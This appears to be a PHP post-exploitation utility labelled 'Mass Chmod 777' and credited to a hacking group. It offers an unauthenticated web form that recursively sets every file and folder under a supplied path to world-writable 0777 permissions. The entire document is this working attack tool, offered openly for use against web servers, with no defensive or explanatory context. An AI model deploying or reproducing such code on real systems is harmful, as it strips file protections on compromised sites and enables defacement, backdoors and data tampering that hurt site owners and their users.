<center><pre>
 <p> Mass Chmod 777 by Zeerx7 # XploitSec ID <br>
 <br>
 <form method='POST'>
  <p>Path:
  <input type='text' name='path' value='<?php echo __DIR__;?>'>
  <input type=submit value='Chmod All!'>
 </form>
<?php
//$d = __DIR__;
function ch($d){
$f = scandir($d);
foreach($f as $v){
 if($v == '.' or $v == '..'){
   continue;
 }elseif(is_dir($d.'/'.$v)){
  echo $d.'/'.$v."\n";
  chmod($d.'/'.$v,0777);
  ch($d.'/'.$v);
 }else{
  echo $d.'/'.$v."\n";
   chmod($d.'/'.$v,0777);
 }
}
}
if($_POST['path']){
echo '.....';
ch($_POST['path']);
}
?>